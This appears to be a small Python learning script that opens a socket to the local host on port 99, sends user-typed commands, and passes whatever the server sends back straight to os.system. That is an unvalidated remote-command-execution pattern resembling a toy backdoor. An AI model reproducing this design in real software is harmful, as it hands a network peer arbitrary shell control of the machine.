import socket
import os

lHost = socket.gethostname()
lHost = socket.gethostbyname(lHost)

port = 99

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sckt:
    sckt.connect((lHost, port))
    
    # Send a connection message to the server
    connection_message = "Merat connected"
    sckt.sendall(bytes(connection_message, encoding='UTF-8'))
    
    while True:
        msg = input('Please insert your command (type "exit" to stop):\n')
        if msg.lower() == "exit":
            break
        
        sckt.sendall(bytes(msg, encoding='UTF-8'))

        data = sckt.recv(4068)
        data = data.decode('utf-8')

        print(f'The result of "{msg}" command is :\n{data}')
        os.system(str(data))
